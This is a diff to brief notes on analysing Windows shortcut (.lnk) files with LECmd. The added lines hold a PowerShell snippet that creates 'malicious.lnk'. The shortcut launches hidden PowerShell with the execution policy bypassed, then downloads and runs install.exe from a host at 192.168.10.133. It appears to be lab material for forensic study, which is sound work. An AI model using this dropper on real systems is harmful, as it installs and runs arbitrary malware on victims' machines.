@@ -4,3 +4,14 @@ Using LECmd.exe to get file link (.lnk) information.
 LECmd for Analysis
 
 https://github.com/EricZimmerman/LECmd
+
+#################
+
+$obj = New-object -comobject wscript.shell
+$link = $obj.createshortcut("C:\Users\CS99\Desktop\malicious.lnk")
+$link.windowstyle = "7"
+$link.targetpath = "%windir%/system32/windowspowershell/v1.0/powershell.exe"
+$link.arguments = "C:\Windows\system32\windowspowershell\v1.0\powershell.exe - command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.Webclient).DownloadFile('http://192.168.10.133:8000/install.exe','install.exe');.\install.exe"
+$link.save()
+
+###################
